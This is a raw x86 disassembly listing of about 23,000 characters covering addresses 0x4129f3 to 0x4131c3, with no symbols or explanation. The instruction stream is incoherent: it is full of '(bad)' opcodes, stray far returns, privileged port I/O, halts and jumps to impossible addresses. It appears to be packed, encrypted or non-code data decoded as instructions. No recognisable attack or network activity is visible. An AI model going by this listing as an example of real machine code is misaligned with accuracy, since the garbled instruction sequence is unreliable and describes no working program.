  4129f3:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  4129fa:	mov    ch,0xff
  4129fc:	clc    
  4129fd:	add    DWORD PTR [ebp+0x60],0x3d
  412a01:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  412a08:	inc    ebp
  412a09:	dec    DWORD PTR [ebx-0x341ff701]
  412a0f:	test   esi,ecx
  412a11:	dec    DWORD PTR [ebx-0x7f8a3301]
  412a17:	push   eax
  412a18:	add    DWORD PTR [ebp+0x0],eax
  412a1b:	dec    ebx
  412a1d:	or     al,0xce
  412a1f:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  412a26:	into   
  412a27:	add    BYTE PTR [ebx-0x34ff1400],cl
  412a2d:	mov    esi,ecx
  412a2f:	sar    bh,0x45
  412a32:	adc    al,0x8b
  412a34:	clc    
  412a35:	fadd   DWORD PTR [ebp+0x0]
  412a38:	mov    ebp,DWORD PTR [edx+0x8]
  412a3b:	push   edi
  412a3c:	adc    BYTE PTR [eax+0x1],0x83
  412a40:	add    al,al
  412a42:	retf   
  412a43:	mov    ecx,esi
  412a45:	cld    
  412a46:	mov    eax,DWORD PTR [eax+0xcb01cc]
  412a4c:	into   
  412a4d:	add    BYTE PTR [ebx+0x756aec00],cl
  412a53:	jne    0x412a88
  412a55:	inc    DWORD PTR [ebx]
  412a57:	rcl    BYTE PTR [ecx+0x50],1
  412a5a:	push   eax
  412a5b:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  412a61:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  412a68:	sar    bh,0x84
  412a6b:	or     BYTE PTR [ebx],al
  412a6d:	push   eax
  412a6e:	add    BYTE PTR [ebx+0x4532c845],cl
  412a74:	pushf  
  412a75:	xor    edi,eax
  412a77:	pushf  
  412a78:	mov    ah,0x89
  412a7a:	test   eax,ebp
  412a7c:	clc    
  412a7d:	inc    ebp
  412a7e:	inc    ebp
  412a7f:	mov    DWORD PTR [eax+eax*8],esi
  412a82:	sub    al,0x30
  412a84:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  412a8b:	dec    ebp
  412a8c:	xor    eax,DWORD PTR fs:[edi+0x3]
  412a90:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  412a96:	xor    eax,DWORD PTR fs:[edi+0x3]
  412a9a:	or     DWORD PTR [ecx+0x45ff085c],0x0
  412aa1:	shl    DWORD PTR [ebp-0x380064],1
  412aa7:	int3   
  412aa8:	lea    eax,[ebp+0x45fff860]
  412aae:	push   eax
  412aaf:	xor    dh,BYTE PTR [ebp-0x64]
  412ab2:	(bad)  
  412ab3:	(bad)  
  412ab4:	pop    esp
  412ab5:	lods   al,BYTE PTR ds:[esi]
  412ab6:	inc    DWORD PTR [ebp+0x4508f8ff]
  412abc:	mov    edi,DWORD PTR [eax+edx*8]
  412abf:	pushf  
  412ac0:	jo     0x412a89
  412ac2:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  412ac9:	inc    ebp
  412aca:	add    BYTE PTR [esi],bh
  412acc:	push   0x8b809c
  412ad1:	in     al,dx
  412ad2:	inc    ebp
  412ad3:	push   ebp
  412ad4:	mov    esi,DWORD PTR [ebx]
  412ad6:	cld    
  412ad7:	add    eax,DWORD PTR [eax+0xf013b]
  412add:	adc    al,0x0
  412adf:	add    bh,bh
  412ae1:	jmp    0xbe2bfe
  412ae6:	add    BYTE PTR [ebp+0x45],cl
  412ae9:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  412aef:	dec    ebp
  412af0:	push   0x38033
  412af5:	cmp    eax,DWORD PTR [eax]
  412af7:	unpcklps xmm7,xmm0
  412afa:	jne    0x412afc
  412afc:	dec    DWORD PTR [ebx+0x5545cc18]
  412b02:	mov    DWORD PTR [ebx],esi
  412b04:	shl    BYTE PTR [ebx],1
  412b06:	inc    ebp
  412b07:	add    ecx,DWORD PTR [ecx+0x60fc803]
  412b0d:	retf   0x5575
  412b10:	dec    DWORD PTR [ebx-0x5ba17e8]
  412b16:	(bad)  
  412b17:	stc    
  412b18:	in     al,dx
  412b19:	or     al,0x85
  412b1b:	dec    ebp
  412b1c:	clc    
  412b1d:	xor    eax,DWORD PTR [ebp+0x3]
  412b20:	mov    ebp,ecx
  412b22:	rol    BYTE PTR [eax],1
  412b24:	inc    ebp
  412b25:	add    BYTE PTR [eax-0x7747ab3],bh
  412b2b:	clc    
  412b2c:	inc    ebp
  412b2d:	retf   
  412b2e:	mov    edx,ebx
  412b30:	in     al,dx
  412b31:	(bad)  
  412b32:	retf   
  412b33:	into   
  412b34:	into   
  412b35:	scas   eax,DWORD PTR es:[edi]
  412b36:	dec    ebp
  412b37:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  412b3d:	sub    ecx,esi
  412b3f:	cmp    ecx,DWORD PTR [ebp+0x77]
  412b42:	(bad)  
  412b43:	mov    edi,eax
  412b45:	int3   
  412b46:	test   DWORD PTR [ecx-0x74baff08],ecx
  412b4c:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  412b53:	xor    eax,DWORD PTR [ebp+0x4503f803]
  412b59:	(bad)  
  412b5b:	retf   0x559c
  412b5e:	(bad)  
  412b5f:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  412b66:	inc    ebp
  412b67:	add    eax,0xeb9c4d3f
  412b6c:	(bad)  
  412b6d:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  412b73:	xor    ecx,DWORD PTR [ebp+0x33]
  412b76:	mov    eax,DWORD PTR [ebx]
  412b78:	call   0xce50f680
  412b7d:	retf   0x55d1
  412b80:	test   BYTE PTR [ebx-0x5ff17fe],cl
  412b86:	jmp    0x412b81
  412b88:	add    BYTE PTR ds:0xebf44d8b,al
  412b8e:	push   ebp
  412b8f:	mov    ebp,DWORD PTR [ebx]
  412b91:	mov    eax,0x33f8558b
  412b96:	retf   
  412b97:	xor    ecx,esi
  412b99:	add    edx,ecx
  412b9b:	add    eax,DWORD PTR [edx+0xca010f]
  412ba1:	push   ebp
  412ba2:	dec    ebp
  412ba3:	mov    ecx,DWORD PTR [ebx-0x34050718]
  412ba9:	stc    
  412baa:	rol    DWORD PTR ds:0xebce4dd6,cl
  412bb0:	scas   eax,DWORD PTR es:[edi]
  412bb1:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  412bb7:	xor    ebp,DWORD PTR [ebx]
  412bb9:	xor    edi,DWORD PTR [ebx]
  412bbb:	add    esi,DWORD PTR [edi+0x3]
  412bbe:	mov    ecx,DWORD PTR [edi]
  412bc0:	clc    
  412bc1:	retf   0x55cb
  412bc4:	into   
  412bc5:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  412bcc:	test   al,0x4d
  412bce:	push   ebp
  412bcf:	jbe    0x412c04
  412bd1:	mov    esi,DWORD PTR [ebx]
  412bd3:	mov    al,0x3
  412bd5:	push   ebp
  412bd6:	add    esi,DWORD PTR [ebx]
  412bd8:	rdpmc  
  412bda:	retf   0x5503
  412bdd:	add    ecx,DWORD PTR [ebx-0x53517f1]
  412be3:	dec    ebp
  412be4:	stc    
  412be5:	mov    ecx,DWORD PTR [eax]
  412be7:	or     BYTE PTR [ebp+0x4d],cl
  412bea:	jmp    0x1352c7a
  412bef:	dec    ebp
  412bf0:	dec    ebp
  412bf1:	(bad)  
  412bf2:	mov    ebx,esp
  412bf4:	clc    
  412bf5:	test   ebx,ecx
  412bf7:	clc    
  412bf8:	ror    DWORD PTR [ebp-0x2a],cl
  412bfb:	mov    esi,ecx
  412bfd:	lock scas eax,DWORD PTR es:[edi]
  412bff:	inc    ebp
  412c00:	mov    esi,DWORD PTR [ebx]
  412c02:	hlt    
  412c03:	pushf  
  412c04:	jge    0x412b91
  412c06:	sub    ebx,esp
  412c08:	cmp    ecx,ebx
  412c0a:	ja     0x412bda
  412c0c:	mov    ebp,DWORD PTR [eax-0x58]
  412c0f:	dec    ebp
  412c10:	xor    ecx,DWORD PTR [di+0x3]
  412c14:	mov    esp,esp
  412c16:	clc    
  412c17:	push   ebp
  412c18:	retf   
  412c19:	mov    dl,bl
  412c1b:	adc    esi,edx
  412c1d:	jb     0x412bed
  412c1f:	add    BYTE PTR [edi-0xb7474b3],ch
  412c25:	lock jge 0x412bf3
  412c28:	sub    ecx,DWORD PTR [ebp+0x3b]
  412c2b:	mov    esi,DWORD PTR [edi-0x20]
  412c2e:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  412c35:	mov    BYTE PTR [ebx-0x34b20729],cl
  412c3b:	mov    edx,ebx
  412c3d:	lock (bad) 
  412c3f:	ror    esi,cl
  412c41:	push   ebp
  412c42:	scas   eax,DWORD PTR es:[edi]
  412c43:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  412c49:	pushf  
  412c4a:	sub    esi,DWORD PTR [edx]
  412c4c:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  412c52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c53:	xor    esp,DWORD PTR [ebx]
  412c55:	add    ecx,DWORD PTR [ebp-0x1c]
  412c58:	mov    edi,DWORD PTR [ebp-0x8]
  412c5b:	mov    bl,cl
  412c5d:	cmp    dl,bl
  412c5f:	jb     0x412c2f
  412c61:	add    dh,dl
  412c63:	dec    ebp
  412c64:	scas   eax,DWORD PTR es:[edi]
  412c65:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  412c6b:	shr    DWORD PTR [ebx],cl
  412c6d:	into   
  412c6e:	cmp    edx,esi
  412c70:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  412c76:	dec    ebp
  412c77:	dec    ebp
  412c78:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  412c7e:	retf   
  412c7f:	xor    edx,esi
  412c81:	add    ecx,esi
  412c83:	imul   ecx,edx
  412c86:	mov    DWORD PTR [ebp+0x8],edx
  412c89:	xor    ecx,DWORD PTR [ebp+0x2b]
  412c8c:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  412c92:	add    esi,DWORD PTR [ebx]
  412c94:	rol    BYTE PTR [ebx],0x45
  412c97:	rdtsc  
  412c99:	xlat   BYTE PTR ds:[ebx]
  412c9a:	pushf  
  412c9b:	jge    0x412c26
  412c9d:	xor    esp,eax
  412c9f:	sub    eax,DWORD PTR [ebp-0x73]
  412ca2:	(bad)  
  412ca3:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  412caa:	dec    ebp
  412cab:	xchg   BYTE PTR [ebx],dh
  412cad:	inc    DWORD PTR [ebx]
  412caf:	(bad)  
  412cb0:	jmp    0x412cff
  412cb2:	mov    ecx,DWORD PTR [ebx-0x34341324]
  412cb8:	dec    ebp
  412cb9:	into   
  412cba:	mov    ebp,DWORD PTR [edi-0x23737420]
  412cc0:	pushf  
  412cc1:	shl    DWORD PTR [edx],cl
  412cc3:	retf   0x5588
  412cc6:	or     ecx,DWORD PTR [ebp+0x7233114d]
  412ccc:	add    eax,DWORD PTR [eax]
  412cce:	in     al,0x4d
  412cd0:	push   ebp
  412cd1:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  412cd7:	fs add ch,cl
  412cda:	dec    ebp
  412cdb:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  412ce1:	dec    ebp
  412ce2:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  412ce8:	jge    0x412cb8
  412cea:	mov    BYTE PTR [edi+0xf723b3a],ch
  412cf0:	add    cl,dh
  412cf2:	dec    ebp
  412cf3:	dec    DWORD PTR [ebx-0x2c032301]
  412cf9:	inc    ebp
  412cfa:	push   ebp
  412cfb:	dec    DWORD PTR [ebx-0x73ff1f34]
  412d01:	lea    ebx,[esp+edx*2+0x508bff32]
  412d08:	mov    ah,0x45
  412d0a:	push   ebp
  412d0b:	mov    esi,DWORD PTR [ebx]
  412d0d:	les    esi,FWORD PTR [ebx]
  412d0f:	add    BYTE PTR [ebx],al
  412d11:	inc    DWORD PTR [ebx]
  412d13:	mov    ecx,DWORD PTR [edi]
  412d15:	cld    
  412d16:	retf   0x4d80
  412d19:	add    DWORD PTR [ecx+0x4d30e400],ecx
  412d1f:	jne    0x412cac
  412d21:	(bad)  
  412d22:	in     al,dx
  412d23:	ror    bl,1
  412d25:	scas   al,BYTE PTR es:[edi]
  412d26:	into   
  412d27:	add    BYTE PTR [edi-0xf2f7475],ch
  412d2d:	not    bl
  412d2f:	adc    al,0xca
  412d31:	inc    ebp
  412d32:	push   ebp
  412d33:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  412d39:	push   0xaf80d6
  412d3e:	mov    eax,DWORD PTR [eax]
  412d40:	fdiv   st(7),st
  412d42:	sti    
  412d43:	sbb    dh,cl
  412d45:	pop    esi
  412d46:	xchg   esp,eax
  412d47:	leave  
  412d48:	pushf  
  412d49:	add    al,0x32
  412d4b:	push   ebp
  412d4c:	cmp    ebp,esp
  412d4e:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  412d52:	dec    DWORD PTR [ecx-0x740f0375]
  412d58:	push   ebp
  412d59:	cld    
  412d5a:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  412d60:	retf   0x558b
  412d63:	clc    
  412d64:	xor    esi,eax
  412d66:	add    esi,DWORD PTR [ebp-0x75]
  412d69:	(bad)  
  412d6a:	hlt    
  412d6b:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  412d72:	mov    DWORD PTR [edx],ecx
  412d74:	hlt    
  412d75:	(bad)  
  412d76:	dec    ebp
  412d77:	add    dh,BYTE PTR [ebx]
  412d79:	leave  
  412d7a:	mov    edx,0xffec8d55
  412d7f:	push   ecx
  412d80:	rol    DWORD PTR [ebp+0x55],1
  412d83:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  412d89:	mov    eax,0xf8030b33
  412d8e:	lar    ecx,di
  412d91:	push   ebp
  412d92:	retf   0x863b
  412d95:	jne    0x412d94
  412d97:	mov    edi,edi
  412d99:	or     BYTE PTR [ebp+0x41],dh
  412d9c:	mov    ebp,esp
  412d9e:	cld    
  412d9f:	inc    eax
  412da0:	mov    al,0x25
  412da2:	add    DWORD PTR [ecx+0x0],eax
  412da5:	in     eax,dx
  412da6:	test   DWORD PTR [ecx-0x1],eax
  412da9:	fdiv   st(7),st
  412dab:	ret    0x8b
  412dae:	cld    
  412daf:	mov    eax,DWORD PTR [eax+0x8d0151]
  412db5:	clc    
  412db6:	xor    BYTE PTR [ebp+0x45],al
  412db9:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  412dbf:	loopne 0x412dc0
  412dc1:	mov    edi,edi
  412dc3:	mov    ecx,eax
  412dc5:	clc    
  412dc6:	jne    0x412d98
  412dc8:	call   0x823ed1
  412dcd:	and    eax,0xc6854575
  412dd2:	je     0x412dd5
  412dd4:	mov    eax,esi
  412dd6:	cld    
  412dd7:	or     DWORD PTR [eax+0x401c9],eax
  412ddd:	push   ebp
  412dde:	add    ah,ch
  412de0:	add    BYTE PTR [ecx+0x6a],dl
  412de3:	inc    ebp
  412de4:	push   esi
  412de5:	mov    DWORD PTR [eax-0x4],edx
  412de8:	pop    edi
  412de9:	mov    ebx,DWORD PTR [ebx-0x4]
  412dec:	ret    0xbe
  412def:	push   es
  412df0:	mov    ecx,DWORD PTR [ecx-0x77274af]
  412df6:	clc    
  412df7:	lock inc ebp
  412df9:	jne    0x412e51
  412dfb:	(bad)  
  412dfc:	jne    0x412e02
  412dfe:	mov    eax,0xf841ba66
  412e03:	fadd   QWORD PTR [esi]
  412e05:	(bad)  
  412e06:	jne    0x412e45
  412e08:	cmp    eax,ebx
  412e0a:	pop    esi
  412e0b:	mov    ecx,DWORD PTR [eax]
  412e0d:	push   ecx
  412e0e:	inc    ecx
  412e0f:	lea    esi,[eax-0x8]
  412e12:	inc    edx
  412e13:	inc    ebp
  412e14:	int    0x8b
  412e16:	inc    edx
  412e17:	cld    
  412e18:	jo     0x412dd9
  412e1a:	inc    ecx
  412e1b:	xchg   edx,esp
  412e1d:	mov    ebx,eax
  412e1f:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  412e25:	or     edi,eax
  412e27:	inc    ebp
  412e28:	inc    ebp
  412e29:	(bad)  
  412e2a:	mov    ecx,DWORD PTR [eax]
  412e2c:	cld    
  412e2d:	(bad)  
  412e2e:	jmp    0x412e31
  412e30:	mov    eax,esi
  412e32:	mov    DWORD PTR ds:0x4f8c98b,eax
  412e38:	rcl    BYTE PTR [esi+0xf],1
  412e3b:	iret   
  412e3c:	inc    ebp
  412e3d:	leave  
  412e3e:	(bad)  
  412e3f:	dec    DWORD PTR [ecx]
  412e41:	mov    eax,esi
  412e43:	mov    eax,DWORD PTR [edi]
  412e45:	mov    dh,0xdd
  412e48:	push   es
  412e49:	nop
  412e4a:	(bad)  
  412e4b:	inc    DWORD PTR [ebx]
  412e4d:	push   esi
  412e4e:	leave  
  412e4f:	iret   
  412e50:	add    al,0x46
  412e52:	push   ebp
  412e53:	jmp    0xff928444
  412e58:	inc    ebp
  412e59:	push   esi
  412e5a:	mov    DWORD PTR [esi-0x4],eax
  412e5d:	in     eax,dx
  412e5e:	push   ebp
  412e5f:	sbb    BYTE PTR [eax+0x7c6daff],bh
  412e65:	add    al,BYTE PTR [edx]
  412e67:	mov    edx,DWORD PTR [ebp-0x17]
  412e6a:	cmp    edi,esi
  412e6c:	jne    0x412e6d
  412e6e:	(bad)  
  412e6f:	push   esi
  412e70:	pop    es
  412e71:	push   ebp
  412e72:	mov    ebp,esp
  412e74:	or     BYTE PTR [ebp+0x41],al
  412e77:	add    edi,esp
  412e79:	sub    BYTE PTR [eax-0x4],al
  412e7c:	int3   
  412e7d:	jne    0x412e41
  412e7f:	add    DWORD PTR [eax],eax
  412e81:	sbb    al,0x8b
  412e83:	mov    edx,DWORD PTR [ecx+0x14]
  412e86:	lea    edx,[edx-0x1ba7508]
  412e8c:	push   esi
  412e8d:	enter  0xd375,0xb8
  412e91:	test   DWORD PTR [esi],0x6ce0750
  412e97:	enter  0xd375,0x3b
  412e9b:	neg    DWORD PTR [esi+0x50]
  412e9e:	or     cl,dl
  412ea0:	inc    edx
  412ea1:	(bad)  
  412ea2:	loope  0x412e90
  412ea4:	(bad)  
  412ea5:	sub    eax,DWORD PTR [ebx]
  412ea7:	inc    eax
  412ea8:	loope  0x412efa
  412eaa:	add    dl,BYTE PTR [eax-0x37]
  412ead:	push   edi
  412eae:	push   ebp
  412eaf:	imul   ah
  412eb1:	adc    DWORD PTR [ecx-0x1],0x45
  412eb5:	add    BYTE PTR [ecx+0x55d3fc00],cl
  412ebb:	lea    edi,[eax-0x7fff4ca]
  412ec1:	mov    eax,0x4550402
  412ec6:	cmp    ebp,ecx
  412ec8:	jne    0x412e75
  412eca:	mov    eax,DWORD PTR ds:0x241e808
  412ed0:	in     eax,dx
  412ed1:	add    BYTE PTR [eax-0x7],al
  412ed4:	out    0x36,eax
  412ed6:	inc    ecx
  412ed7:	aas    
  412ed8:	jmp    0xccf15a
  412edd:	lock mov edi,DWORD PTR [ebp-0x18]
  412ee1:	and    edi,edi
  412ee3:	mov    edi,edi
  412ee5:	call   0xe40f2fc1
  412eea:	push   es
  412eeb:	add    al,ch
  412eed:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  412ef4:	(bad)  
  412ef5:	hlt    
  412ef6:	add    eax,0xffd3e87d
  412efb:	cmp    bh,0x8
  412efe:	(bad)  
  412eff:	fld    DWORD PTR [esi]
  412f01:	out    dx,al
  412f02:	call   0xffa02e0a
  412f07:	cmp    al,0x46
  412f09:	shl    edx,0x8
  412f0c:	(bad)  
  412f0d:	pop    es
  412f0e:	fisttp QWORD PTR [ebp+0xe577eff]
  412f14:	push   ebx
  412f15:	add    BYTE PTR [ebx+0x24008b56],cl
  412f1b:	add    BYTE PTR [ebp+0x50],al
  412f1e:	push   eax
  412f1f:	add    DWORD PTR [ebx+0x757d1834],ecx
  412f25:	sub    edx,DWORD PTR [esi-0x24]
  412f28:	jne    0x412ee0
  412f2a:	lods   eax,DWORD PTR ds:[esi]
  412f2b:	mov    edx,DWORD PTR [edx-0x34]
  412f2e:	dec    esi
  412f2f:	out    0x83,eax
  412f31:	into   
  412f32:	push   edi
  412f34:	loopne 0x412f04
  412f36:	shr    BYTE PTR [edx+ecx*4+0x0],1
  412f3a:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  412f41:	rol    DWORD PTR [edx],0x8
  412f44:	mov    esp,ecx
  412f46:	cmp    DWORD PTR [ebx],0xc
  412f49:	mov    esi,0x5001c0
  412f4e:	push   eax
  412f4f:	push   cs
  412f50:	push   eax
  412f51:	(bad)  
  412f52:	sub    edx,edi
  412f54:	push   esi
  412f55:	adc    al,0xcb
  412f57:	ins    DWORD PTR es:[edi],dx
  412f58:	mov    eax,0x203e8
  412f5d:	add    al,ah
  412f5f:	inc    esi
  412f60:	mov    al,ch
  412f62:	pop    es
  412f63:	add    DWORD PTR [eax],0x1
  412f66:	add    dh,al
  412f68:	add    ah,ch
  412f6a:	rol    DWORD PTR [edx-0xd],1
  412f6d:	cli    
  412f6e:	push   0x4a
  412f70:	pop    ecx
  412f71:	retf   0xfe6
  412f74:	add    BYTE PTR [ebx-0x4e72f41e],al
  412f7a:	(bad)  
  412f7b:	dec    BYTE PTR [ebx+0x45b1fc72]
  412f81:	(bad)  
  412f82:	sub    ebp,DWORD PTR [ebx]
  412f84:	and    al,0x52
  412f86:	(bad)  
  412f87:	dec    edi
  412f88:	inc    ebp
  412f89:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  412f90:	add    BYTE PTR [ebp-0x7b],dh
  412f93:	pop    eax
  412f94:	add    BYTE PTR [edx+0x0],bl
  412f97:	pop    edx
  412f98:	dec    ebp
  412f99:	jmp    DWORD PTR [ebx]
  412f9b:	and    al,0xec
  412f9d:	push   edx
  412f9e:	out    0x64,eax
  412fa0:	jmp    0xd3f325a5
  412fa5:	jmp    0x412fff
  412fa7:	mov    al,0xfe
  412fa9:	dec    BYTE PTR [ebp-0x18fd8018]
  412faf:	add    BYTE PTR [esi+ebp*1],bh
  412fb2:	pop    edx
  412fb3:	icebp  
  412fb4:	mov    eax,cs
  412fb6:	ins    BYTE PTR es:[edi],dx
  412fb7:	adc    eax,0x75510000
  412fbc:	mov    esi,0x70158
  412fc1:	or     DWORD PTR [eax-0x74f48dfe],esi
  412fc7:	mov    edi,esp
  412fc9:	cld    
  412fca:	jge    0x413041
  412fcc:	(bad)  
  412fce:	aas    
  412fcf:	and    al,0x6d
  412fd1:	adc    cl,0x1
  412fd4:	mov    eax,DWORD PTR [eax]
  412fd6:	and    ecx,DWORD PTR [ebx-0x167203fd]
  412fdc:	dec    ebp
  412fdd:	add    eax,ebp
  412fdf:	add    BYTE PTR [edx],al
  412fe1:	fadd   DWORD PTR [eax]
  412fe3:	stc    
  412fe4:	enter  0xee00,0x8b
  412fe8:	sbb    eax,0x1
  412feb:	sbb    esi,ecx
  412fed:	in     al,0x0
  412fef:	in     eax,dx
  412ff0:	add    BYTE PTR [eax],al
  412ff2:	jne    0x412f7f
  412ff4:	cmp    edx,esp
  412ff6:	jb     0x413001
  412ff8:	jmp    0x41306f
  412ffa:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  413000:	add    BYTE PTR [ebx+0x4d83d840],cl
  413006:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  41300c:	jb     0x412f97
  41300e:	pop    edx
  41300f:	fadd   QWORD PTR [ebx-0x7445faa1]
  413015:	or     dh,BYTE PTR [edx+0x0]
  413018:	inc    edx
  413019:	or     dl,bh
  41301b:	xlat   BYTE PTR ds:[ebx]
  41301c:	dec    edx
  41301d:	push   edi
  41301e:	add    al,0x7
  413020:	leave  
  413021:	rol    DWORD PTR [edx+eax*1],0x7
  413025:	add    ecx,ecx
  413027:	mov    edx,ecx
  413029:	int3   
  41302a:	jmp    0x412fea
  41302c:	mov    al,0x0
  41302e:	(bad)  
  41302f:	jne    0x413019
  413031:	mov    eax,DWORD PTR [edx]
  413033:	call   0xc155ad38
  413038:	pop    edi
  413039:	add    ebx,DWORD PTR [ecx-0x37]
  41303c:	pop    ecx
  41303d:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  413044:	push   es
  413045:	mov    eax,DWORD PTR [eax]
  413047:	int3   
  413048:	add    ch,al
  41304a:	jae    0x413034
  41304c:	int    0x1
  41304e:	enter  0x3000,0x18
  413052:	add    BYTE PTR [ebp+0x75],al
  413055:	mov    esi,DWORD PTR [eax-0x171f0134]
  41305b:	push   0x2
  41305d:	pop    ecx
  41305e:	add    BYTE PTR [eax],cl
  413060:	push   ebx
  413061:	lea    edi,[edi+eax*2]
  413064:	mov    al,0x1
  413066:	jb     0x413068
  413068:	mov    al,0x10
  41306a:	push   eax
  41306b:	add    al,0x75
  41306d:	add    BYTE PTR [ebx],ch
  41306f:	add    ebx,esp
  413071:	int3   
  413072:	jne    0x413084
  413074:	movsx  edx,cl
  413077:	add    DWORD PTR [eax],eax
  413079:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  413080:	mov    gs,edi
  413082:	add    BYTE PTR [eax-0x50],ch
  413085:	add    al,ch
  413087:	mov    eax,DWORD PTR [ecx]
  413089:	sub    eax,DWORD PTR [eax]
  41308b:	jb     0x413102
  41308d:	add    DWORD PTR [esp+eiz*8-0x50],esi
  413091:	jge    0x41307b
  413093:	add    al,0x1
  413095:	add    DWORD PTR [eax],0x0
  413098:	jne    0x41309a
  41309a:	je     0x4130e1
  41309c:	mov    eax,DWORD PTR [edi]
  41309e:	ror    BYTE PTR [ebp+0x4d],1
  4130a1:	or     DWORD PTR [ecx+0x4d03d004],0x3
  4130a8:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  4130ae:	mov    DWORD PTR [ebx],ebp
  4130b0:	fadd   DWORD PTR [eax+0x75]
  4130b3:	inc    eax
  4130b4:	pop    eax
  4130b5:	lea    ebx,[ecx+0x4f]
  4130b8:	push   0xb1000003
  4130bd:	out    dx,eax
  4130be:	add    ebp,DWORD PTR [edx+edx*2]
  4130c1:	add    BYTE PTR [ebx+ecx*4],bh
  4130c4:	mov    ch,BYTE PTR [ebx]
  4130c6:	jb     0x41313a
  4130c8:	add    al,0x89
  4130ca:	push   eax
  4130cb:	call   0x84297e3d
  4130d0:	add    DWORD PTR [eax+eax*1],eax
  4130d3:	jae    0x4130e9
  4130d5:	icebp  
  4130d6:	inc    ebp
  4130d7:	mov    eax,DWORD PTR gs:[ecx]
  4130da:	int3   
  4130db:	out    dx,al
  4130dc:	loopne 0x41312b
  4130de:	sub    eax,DWORD PTR [edx]
  4130e0:	push   0xffffff83
  4130e2:	pop    esi
  4130e3:	push   cs
  4130e4:	jl     0x4130ff
  4130e6:	add    al,0xaf
  4130e8:	xor    eax,0x832b6d00
  4130ed:	mov    eax,DWORD PTR [edx]
  4130ef:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4130f5:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4130fb:	inc    ebp
  4130fc:	shr    ebx,0x3
  4130ff:	or     DWORD PTR [eax],0x4
  413102:	push   0xffffffa5
  413104:	pop    esi
  413105:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  41310c:	jmp    0x41316b
  41310e:	mov    edi,0xff0272
  413113:	fdivr  QWORD PTR [ebp+0x5d]
  413116:	push   0x4e
  413118:	pop    ecx
  413119:	call   0x41751e
  41311e:	mov    DWORD PTR [ebx],eax
  413120:	in     al,0xc8
  413122:	rol    BYTE PTR [ebp-0x75],0xc1
  413126:	call   0xab3307
  41312b:	pop    esi
  41312c:	enter  0xceff,0x8b
  413130:	repz mov ecx,DWORD PTR [ebp-0x34]
  413134:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  41313b:	je     0x41313d
  41313d:	or     DWORD PTR [ebx-0x74183b24],eax
  413143:	jne    0x413129
  413145:	jmp    0x413140
  413147:	push   DWORD PTR [edx-0x24]
  41314a:	push   0x4d
  41314c:	pop    ecx
  41314d:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  413151:	jge    0x413159
  413153:	mov    eax,eax
  413155:	sub    ebp,DWORD PTR [edx+0x24]
  413158:	pop    esi
  413159:	inc    ebp
  41315a:	mov    esp,0x8b6077
  41315f:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  413165:	lods   al,BYTE PTR ds:[esi]
  413166:	add    BYTE PTR [ebx],bh
  413168:	enter  0xce73,0x49
  41316c:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  413174:	stc    
  413175:	jge    0x4131e9
  413177:	jnp    0xdd40b4d8
  41317d:	call   0xc43253
  413182:	fadd   st(0),st
  413184:	dec    esi
  413185:	ins    BYTE PTR es:[edi],dx
  413186:	stc    
  413187:	cmp    al,0x73
  413189:	push   ebp
  41318a:	mov    eax,0xf8028b
  41318f:	jne    0x413152
  413191:	mov    esi,ecx
  413193:	mov    esp,DWORD PTR [ebp+0x2c]
  413196:	add    edi,DWORD PTR [ebp-0x24]
  413199:	sub    esp,eax
  41319b:	and    al,0x45
  41319d:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  4131a3:	sbb    al,0xee
  4131a5:	pop    esi
  4131a6:	call   0x8131d6
  4131ab:	fsubr  st,st(3)
  4131ad:	sti    
  4131ae:	add    BYTE PTR gs:[ecx],bh
  4131b1:	add    eax,esp
  4131b3:	add    DWORD PTR [esi],eax
  4131b5:	rol    DWORD PTR [ebp+0x8],0x29
  4131b9:	mov    esp,eax
  4131bb:	clc    
  4131bc:	jne    0x413233
  4131be:	mov    eax,0x8b0673
  4131c3:	loopne 0x41320a
